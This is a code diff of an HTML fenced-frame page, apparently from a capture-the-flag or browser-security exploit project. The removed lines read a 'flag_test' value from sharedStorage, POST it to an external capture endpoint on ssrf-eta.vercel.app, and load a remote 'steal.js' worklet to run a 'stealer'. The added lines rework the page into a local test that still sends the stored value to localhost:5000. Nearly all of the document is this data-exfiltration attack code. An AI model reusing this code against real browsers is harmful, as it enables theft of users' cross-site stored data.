@@ -6,18 +6,29 @@
   <title>Fenced Frame</title>
 </head>
 <body>
+  <div id="statusMessage">Loading...</div> <!-- Display message here -->
+
   <script>
-    // Wait for the message from the parent and start the exfiltration process
     window.addEventListener('message', async (event) => {
       if (event.data === 'start') {
         try {
+          const statusMessage = document.getElementById('statusMessage');
+          
+          // Check if flag_test exists in sharedStorage
           const flag = await sharedStorage.get("flag_test");
 
-          // Prepare the data to send to the capture endpoint
-          const dataToSend = flag || "no flag yet"; // If flag exists, use it, else use default value.
+          if (flag) {
+            statusMessage.innerText = `test_flag exists! Value: ${flag}`;
+          } else {
+            statusMessage.innerText = "test_flag does not exist, setting it...";
+            // Set a value for flag_test
+            await sharedStorage.set("flag_test", "test_flag_value");
+            console.log("SharedStorage flag_test set to test_flag_value.");
+          }
 
-          // Send the flag (or default) to https://ssrf-eta.vercel.app/api/capture
-          await fetch("https://ssrf-eta.vercel.app/api/capture", {
+          // Send the flag to localhost:5000 for testing
+          const dataToSend = flag || "no flag yet";
+          await fetch("http://localhost:5000/report", {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
@@ -25,20 +36,11 @@
             body: JSON.stringify({ flag: dataToSend })
           });
 
-          console.log("Sent flag to capture endpoint.");
-
-          // If flag_test exists, run the stealer
-          if (flag) {
-            sharedStorage.worklet.addModule("https://ssrf-eta.vercel.app/steal.js");
-            sharedStorage.run("stealer");
-            console.log("Running stealer to exfil flag.");
-          } else {
-            // If no flag_test exists, set it to the default value
-            await sharedStorage.set("flag_test", "maybe");
-            console.log("SharedStorage flag_test set to default value.");
-          }
+          console.log("Flag sent to localhost:5000/report.");
+          
         } catch (err) {
-          console.error("Error during exfiltration:", err);
+          console.error("Error accessing sharedStorage:", err);
+          document.getElementById('statusMessage').innerText = "Error accessing sharedStorage.";
         }
       }
     });
